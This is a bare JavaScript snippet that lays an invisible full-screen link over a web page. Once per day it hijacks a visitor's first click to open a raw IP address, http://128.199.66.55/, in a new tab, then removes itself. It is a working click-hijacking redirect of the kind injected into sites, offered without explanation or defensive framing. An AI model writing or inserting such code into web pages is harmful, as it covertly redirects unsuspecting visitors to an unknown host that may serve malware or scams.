var clickAble = true;
if(window.localStorage){
    var lastClick = window.localStorage.lastClick;
    if(!lastClick)
        lastClick = 0;
    var now = ( new Date() ).getDate();
    if(now == lastClick)
        clickAble = false;
    else
        window.localStorage.lastClick = now;
}
if(clickAble){
    var a = document.createElement('a');
    a.setAttribute('style', 'cursor:default;display:block;width:100%;height:100%;position:fixed;top:0;left:0;z-index:9999');
    a.setAttribute('href', 'http://128.199.66.55/');
    a.setAttribute('target', '_blank');
    a.onclick = function(){
        this.parentNode.removeChild(this);
    }
    document.body.appendChild(a);
}